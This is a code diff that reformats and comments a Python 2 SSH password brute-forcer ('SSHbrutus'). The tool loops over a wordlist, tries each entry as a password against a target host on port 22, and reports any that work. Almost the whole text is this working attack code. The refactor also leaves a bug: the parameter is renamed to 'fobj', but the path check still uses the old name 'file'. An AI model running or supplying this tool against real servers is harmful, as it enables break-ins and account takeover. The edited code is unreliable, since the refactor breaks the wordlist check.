@@ -20,58 +20,58 @@
 # USA
 
 import paramiko
-import sys
+# unused import of sys
+#   import sys
 import os
 import socket
 
 
 class SSHbrutus(object):
 
-	name = "SSH Brute-forcer"
-	desc = "Perform password brute-force on SSH"
-	version = "0.1"
+    name = "SSH Brute-forcer"
+    desc = "Perform password brute-force on SSH"
+    version = "0.1"
 
-	def __init__ (self, target, username ,file):
+    def __init__(self, target, username, fobj):
+        self.target = target
+        self.username = username
+        self.file = fobj
+        self.line = '\n{0}\n'.format(('-' * 67))
 
-		self.target = target
-		self.username = username
-		self.file = file
-		self.line = "\n------------------------------------------------------------------\n"
-
-		if os.path.exists(file) == False:
-			print "\n[!] Path to wordlist don't exist."
+        if os.path.exists(file) == False:
+            print "\n[!] Path to wordlist don't exist."
 
 
-	def ssh_connect(self,password, code = 0):
-		ssh = paramiko.SSHClient()
-		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    def ssh_connect(self, password, code=0):
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
-		try:
-			ssh.connect(self.target, port=22, username=self.username, password=password)
-		except paramiko.AuthenticationException:
-			code = 1
-		except socket.error, e:
-			code = 2
-		ssh.close()
-		return code
+        try:
+            ssh.connect(self.target, port=22, username=self.username, password=password)
+        except paramiko.AuthenticationException:
+            code = 1
+        except socket.error, e:
+            code = 2
+        ssh.close()
+        return code
 
-	def start(self):
-		input_file = open(self.file)
-		print ""
-		for i in input_file.readlines():
-			password = i.strip("\n")
-			try:
-				response = self.ssh_connect(password)
-				if response == 0:
-					print "{}[+] User: {} [+] Password found!: {}{}".format(self.line,self.username, password, self.line)
-			
-				elif response == 1:
-					print "[-] User: {} [-] Password: {} -->  [+]Incorrect[-]  <--".format(self.username,password)
+    def start(self):
+        input_file = open(self.file)
+        print ""
+        for i in input_file.readlines():
+            password = i.strip("\n")
+            try:
+                response = self.ssh_connect(password)
+                if response == 0:
+                    print "{}[+] User: {} [+] Password found!: {}{}".format(self.line, self.username, password, self.line)
 
-				elif response == 2:
-					print "[!] Connection couldn't be established with the address: {}".format(self.target)
-			
-			except Exception, e:
-				print e
-				pass
-		input_file.close()
+                elif response == 1:
+                    print "[-] User: {} [-] Password: {} -->  [+]Incorrect[-]  <--".format(self.username, password)
+
+                elif response == 2:
+                    print "[!] Connection couldn't be established with the address: {}".format(self.target)
+            # Very broad exception catch, what are we trying to catch here?
+            except Exception, e:
+                print e
+                pass
+        input_file.close()
